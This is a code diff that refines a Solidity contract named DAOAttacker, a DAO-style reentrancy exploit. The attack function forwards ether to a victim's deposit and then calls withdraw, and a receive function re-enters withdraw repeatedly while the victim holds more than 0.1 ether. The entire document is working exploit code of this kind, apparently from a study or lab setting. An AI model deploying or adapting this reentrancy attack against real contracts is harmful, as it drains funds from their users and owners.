@@ -10,14 +10,14 @@ contract DAOAttacker {
     }
 
     function attack() external payable {
-        victim.deposit();
+        victim.deposit{value: msg.value}();
         victim.withdraw(address(this));
     }
 
-    fallback() external {
+    receive() external payable {
         // may be a better expression in if statement,
         // this version may lead to REVERT;
-        if (address(this).balance >= 0) {
+        if (address(victim).balance > 0.1 ether) {
             victim.withdraw(address(this));
         }
     }
